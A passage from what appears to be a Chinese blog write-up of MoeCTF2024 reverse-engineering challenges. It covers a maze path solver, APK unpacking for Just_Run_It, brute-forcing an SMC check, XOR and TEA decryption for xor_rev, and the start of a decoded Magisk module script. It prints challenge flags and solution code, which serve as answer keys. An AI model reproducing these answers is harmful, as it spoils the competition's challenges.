class="hljs-string">&#x27;s&#x27;</span>;<br>		&#125;<br>		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;<br>			<span class="hljs-keyword">switch</span> ( v7[i] )&#123;<br>				<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>					<span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">1</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190((v5 - <span class="hljs-number">1</span>), v4))&#123;&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						--v5;<br>						out[k++]=v7[i];<br>						pan=<span class="hljs-number">1</span>;        	<br>					&#125;<br>					<span class="hljs-keyword">break</span>;<br>				<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>					<span class="hljs-keyword">if</span> ( v5 &gt;= <span class="hljs-number">80</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190((v5 + <span class="hljs-number">1</span>), v4) )&#123;&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						++v5;<br>						out[k++]=v7[i];<br>						pan=<span class="hljs-number">1</span>;<br>					&#125;<br>					<span class="hljs-keyword">break</span>;<br>				<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>					<span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">56</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190(v5, (v4 + <span class="hljs-number">1</span>)) )&#123;&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						++v4;<br>						out[k++]=v7[i];<br>						pan=<span class="hljs-number">1</span>;<br>					&#125;<br>					<span class="hljs-keyword">break</span>;<br>				<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>					<span class="hljs-keyword">if</span> ( v4 &lt;= <span class="hljs-number">1</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190(v5, (v4 - <span class="hljs-number">1</span>)) )&#123;&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						--v4;<br>						out[k++]=v7[i];<br>						pan=<span class="hljs-number">1</span>;<br>					&#125;<br>					<span class="hljs-keyword">break</span>;<br>				<span class="hljs-keyword">default</span>:<br>					<span class="hljs-keyword">break</span>;<br>			&#125;<br>			<span class="hljs-keyword">if</span>(pan==<span class="hljs-number">1</span>)&#123;<br>				<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,k);<br>				<span class="hljs-comment">//printf(&quot;%c&quot;,v7[i]);</span><br>				pan=<span class="hljs-number">0</span>;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			<br>		&#125;<br>		<br>	&#125;<br>	<span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">75</span> &amp;&amp; v4 == <span class="hljs-number">55</span> )&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,out);<br>	&#125;<br>	<span class="hljs-type">char</span> s[]=<span class="hljs-string">&quot;sddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdsdssddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdddwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwddddddddddddddddwwwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwddddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddssssaaaaaaaaaassdddddddssaaaaaassddddddddddddssaaaaaaaaaaaassdddddddddddsssssaaaaaaaaaaaaaassaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssssaaaaaaaaaaaaaaaassddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwawawwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaaaasssssssssssssssssssssssssddddddddddddddddddddddddddddddddddwddddddddddddddddddwdddwwwdddddddddddddddwwaaaaaaaaaaaaaaawwddddddwwaaaaaaawwddddddddddddddssdddwwwawwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwwwwwwwwwwwwwwwwwwwwdddssssssssssssssssssssssssssssssssssssssssssss&quot;</span>;<br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span> v3=<span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1176</span>;i++)<br>		v3 += i * <span class="hljs-number">3113131</span> *(<span class="hljs-type">int</span>)(s[i]) + i * i + <span class="hljs-number">1131796</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llu&quot;</span>,v3);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Just-Run-It"><a href="#Just-Run-It" class="headerlink" title="Just_Run_It"></a>Just_Run_It</h2><p>0x0和0x1都是脱壳后解码</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724468535615-5af557bb-3d5b-4b4e-b21c-d47da3b9f0c1.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724469127727-6b6389b4-f381-4331-9bbf-0ea6697dee34.png" srcset="/img/loading.gif" lazyload class="" title="img">



<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472342291-10eaa4b2-d305-4504-9984-6d97e67bb432.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>模拟器运行不了，开启事件无法调试</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472556548-3ffe5532-4c5c-408c-88b1-7162c73af94f.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>要么根据签名v2直接找工具绕，要么找到密文直接base64解密，要么找检验函数修改后重新打包（最后一种比较难，出题者肯定不希望我们这样做）</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724511920066-c8aa02db-2683-46eb-9d0e-a56fe3bb7a01.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>META-INF是签名之后的文件，DebugProbestKt.bin用于后续调试</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724550601096-d661329a-fd5c-4eb7-b75c-4e53550dfd67.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>后面qetx找到<a target="_blank" rel="noopener" href="https://appetize.io/app/android/cn.edu.xidian.myapplication?device=pixel7&osVersion=14.0">Play My Application (appetize.io)</a></p>
<p>可以模拟多个环境</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724642186848-ba9a7fd4-1481-46eb-a468-999ca49ed09d.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480966167-4da06b90-0272-46bc-8c06-6fb8d3f46ada.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480982752-32ee9808-4d52-46a3-9faa-c35ab1aa5a49.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>bW9lY3RmezU5ZmE2MDJjLTYyNGEtNDBiNy04YTVjLWUzNWU1NzRjZjliOX0&#x3D;</p>
<h2 id="SMCProMax"><a href="#SMCProMax" class="headerlink" title="SMCProMax"></a>SMCProMax</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724679306184-55d2be46-1f9f-42a2-937c-1b0513d92d4e.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>moectf{1111111111111111111111111111111111111111}</p>
<p>moectf{y0u_mu5t_know_vvHAt_1s__SMC__n0w}</p>
<p>直接爆破出来发现不对去调试，发现在下面会跳出</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724813588701-fddd2816-33a7-40d6-8d42-e0a2ae6029ea.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>一开始有个地方异或了，没执行到，但是最后的密文还是要异或一步</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0x7A5FB55E</span>,<span class="hljs-number">-490481854</span>,<span class="hljs-number">-1704322843</span>,<span class="hljs-number">-1418679088</span>,<span class="hljs-number">0x52C815D</span>,<span class="hljs-number">0x28D70A82</span>,<span class="hljs-number">0x398E5EAA</span>,<span class="hljs-number">0xFC4A5AF</span>,<span class="hljs-number">-1342106783</span>,<span class="hljs-number">0xCECDD9C3</span>&#125;; <br>    <span class="hljs-type">int</span> m=<span class="hljs-number">0xC4F3B4B3</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0x20202020</span>;j&lt;=<span class="hljs-number">0x7d7d7d7d</span>;j++)&#123;<br>            <span class="hljs-type">int</span> t=j;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">32</span>;k++)&#123;<br>                <span class="hljs-keyword">if</span> (t&gt;=<span class="hljs-number">0</span>)&#123;<br>                    t=t*<span class="hljs-number">2</span>;<br>                &#125; <br>                <span class="hljs-keyword">else</span>&#123;<br>                    t=t*<span class="hljs-number">2</span>;<br>                    t^=m;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(t==a[i])&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;n&lt;<span class="hljs-number">32</span>;n+=<span class="hljs-number">8</span>)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(j&gt;&gt;n)&amp;<span class="hljs-number">0xff</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>        &#125; <br><br><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>moectf&#123;y0u_mu5t_know_vvZAt_1s__SMC__n0w&#125;<br></code></pre></td></tr></table></figure>

<h2 id="xor-rev"><a href="#xor-rev" class="headerlink" title="xor_rev"></a>xor_rev</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827254498-19e8c8a8-5eb3-4534-a704-e2441493beaa.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">s=[<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>   <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>]<br>enc=[<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3C</span>,<br>     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>,<br>     <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>,<br>     <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    enc[i]^=s[i%<span class="hljs-number">16</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#This_1s_a_f4k3_flag_plzTry_ag4in</span><br></code></pre></td></tr></table></figure>

<p>调试的时候发现后面还有tea</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827974635-2f61db70-4857-467b-8fda-e9511a9746fb.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>解tea的时候记得打印%02x</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x61C88647</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = (<span class="hljs-number">-32</span>)*delta, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x5e87ff17</span>,<span class="hljs-number">0x9a831a78</span>,<span class="hljs-number">0x56c8707a</span>,<span class="hljs-number">0xc52f51</span>,<span class="hljs-number">0x8bc7393</span>,<span class="hljs-number">0xc7c31e09</span>,<span class="hljs-number">0xb1efa477</span>,<span class="hljs-number">0xddcf1d26</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x6C6C6568</span>, <span class="hljs-number">0x6F6D5F6F</span>, <span class="hljs-number">0x66746365</span>, <span class="hljs-number">0x34323032</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// v为要加密的数据是两个32位无符号整数</span><br>    <span class="hljs-comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">8</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flag不全的话有可能是10</span><br>    	sum = (<span class="hljs-number">-32</span>)*delta;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>            v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>            sum += delta;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>a=[<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>  <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>]<br>enc=[<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>,<br>  <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>]<br>a1=[<span class="hljs-number">0x2B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>,<br>  <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3B</span>,<br>  <span class="hljs-number">0x16</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x19</span>,<br>  <span class="hljs-number">0x94</span>, <span class="hljs-number">0x87</span>]<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">32</span>):<br>    enc[i]^=a1[i]<br>    <span class="hljs-meta">#print(hex(enc[i]),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br>a2=[<span class="hljs-number">0x17</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0xbc</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xdd</span>]<br><br>def byte2uint32(d):<br>    l = []<br>    <span class="hljs-keyword">for</span> i in range(len(d) <span class="hljs-comment">// 4):</span><br>        tmp = d[i * <span class="hljs-number">4</span>:i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>]<br>        l.append(tmp[<span class="hljs-number">3</span>] * <span class="hljs-number">256</span> ** <span class="hljs-number">3</span> + tmp[<span class="hljs-number">2</span>] * <span class="hljs-number">256</span> ** <span class="hljs-number">2</span> + tmp[<span class="hljs-number">1</span>] * <span class="hljs-number">256</span> + tmp[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> l<br><br># enc_uint32 = byte2uint32(a2)<br><span class="hljs-meta"># print(<span class="hljs-string">&quot;\n&quot;</span>)</span><br><span class="hljs-meta"># for i in range(len(enc_uint32)):</span><br><span class="hljs-meta">#     print(hex(enc_uint32[i]),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br><br>s1=<span class="hljs-string">&quot;050a090f1b3916070a142b075c6f57551b1c33061a310630040d103946555349&quot;</span><br><span class="hljs-meta"># print(len(s1))</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">32</span>):<br>    <span class="hljs-meta">#print(int(s1[2*i:2*(i+1)],16))</span><br>    <span class="hljs-meta">#print((((int(s1[2*i:2*(i+1)],16)^a[i%16])+256)%256),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br>    print(chr((((<span class="hljs-type">int</span>(s1[<span class="hljs-number">2</span> * i:<span class="hljs-number">2</span> * (i + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>) ^ a[i % <span class="hljs-number">16</span>]) + <span class="hljs-number">256</span>) % <span class="hljs-number">256</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="Secret-Module"><a href="#Secret-Module" class="headerlink" title="Secret_Module"></a>Secret_Module</h2><p>sh文件base64+解压缩得到php</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723275505793-96bed9fe-45c9-4f68-83fb-4695676721f3.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">testk</span>() &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span><br>  (/system/bin/getevent -lc <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events) || <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;   <br><br><span class="hljs-title function_ invoke__">choose</span>() &#123;<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>  /system/bin/getevent -lc <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events<br>  <span class="hljs-keyword">if</span> (`cat <span class="hljs-variable">$MODPATH</span>/events <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span> | /system/bin/grep VOLUME &gt;/dev/<span class="hljs-literal">null</span>`); then<br>  <span class="hljs-keyword">break</span><br>  fi<br>  done<br>  <span class="hljs-keyword">if</span> (`cat <span class="hljs-variable">$MODPATH</span>/events <span class="hljs-number">2</span>&gt;/dev/<span 